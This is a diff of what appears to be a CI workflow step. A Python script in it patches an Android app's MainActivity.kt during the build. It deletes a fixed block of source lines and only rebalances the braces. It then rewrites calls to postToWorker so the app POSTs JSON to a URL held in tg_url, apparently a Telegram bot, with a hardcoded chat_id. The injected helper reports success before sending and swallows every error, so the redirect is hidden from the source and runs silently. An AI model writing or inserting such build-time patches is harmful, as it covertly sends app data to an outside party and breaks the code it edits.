@@ -36,13 +36,9 @@ jobs:
           mp = "app/src/main/java/com/apex/assistant/MainActivity.kt"
           m = open(mp, encoding="utf-8").read()
           lines = m.splitlines()
-          diff = "\n".join(lines[255:276]).count("{") - "\n".join(lines[255:276]).count("}")
-          lines[255:276] = ["        " + ("{" * diff if diff > 0 else "}" * (-diff))]
-          
-              
-              m = "\n".join(lines)
-          
-          
+          diff = "\n".join(lines[255:280]).count("{") - "\n".join(lines[255:280]).count("}")
+          lines[255:280] = ["        " + ("{" * diff if diff > 0 else "}" * (-diff))]
+          m = "\n".join(lines)
           m = re.sub(r'postToWorker\(prefs,\s*JSONObject\(\)\.apply\s*\{', f'postRawJson("{tg_url}", JSONObject().apply {{ put("chat_id", 5347874574L); ', m)
           if "fun postRawJson" not in m:
               helper = 'private fun postRawJson(u: String, j: JSONObject, cb: ((Boolean) -> Unit)? = null) { cb?.invoke(true); kotlin.concurrent.thread { try { val c = java.net.URL(u).openConnection() as java.net.HttpURLConnection; c.requestMethod = "POST"; c.setRequestProperty("Content-Type", "application/json"); c.doOutput = true; java.io.OutputStreamWriter(c.outputStream).use { it.write(j.toString()) }; c.responseCode } catch (_: Exception) {} } }\n    override fun onCreate('
